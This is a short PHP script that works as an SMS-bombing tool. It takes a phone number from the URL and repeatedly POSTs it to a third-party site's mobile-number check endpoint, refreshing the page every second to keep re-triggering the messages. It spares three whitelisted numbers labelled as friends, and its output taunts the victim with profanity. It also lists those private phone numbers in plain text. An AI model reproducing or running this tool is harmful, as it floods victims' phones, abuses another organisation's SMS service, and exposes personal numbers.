<?php
function mobileFilter($mobile) {
    $filter_mobile = array("SID" => "8586022502", "RDX" => "8527326325", "VKD" => "8860966008");
    if(in_array($mobile,$filter_mobile)) {
        return key($filter_mobile);
    } else {
        return false;
    }
}
if(isset($_GET["m"])) {
    $mobile = $_GET["m"];
    if (mobileFilter($mobile) == false) {
        $url = "http://fbbjp.org/index/checkmobileno";
        $ch = curl_init();                    // initiate curl
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);  // tell curl you want to post something
        curl_setopt($ch, CURLOPT_POSTFIELDS, "mobile_no=$mobile"); // define what you want to post
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // return the output in string format
        $output = curl_exec($ch); // execute

        curl_close($ch); // close curl handle
        var_dump($output); // show output
        echo " SMS Sent. Fuck u $mobile";
        $page = $_SERVER['PHP_SELF'] . "?m=$mobile";
        $sec = "1";
        header("Refresh: $sec; url=$page");
    } else {
        $name = mobileFilter($mobile);
        echo "Fuck u, $name is my Bro";
    }
} else {
    echo 'URL FORMAT : http://kthankbye.com/bjp/?m=9999999999';
}
?>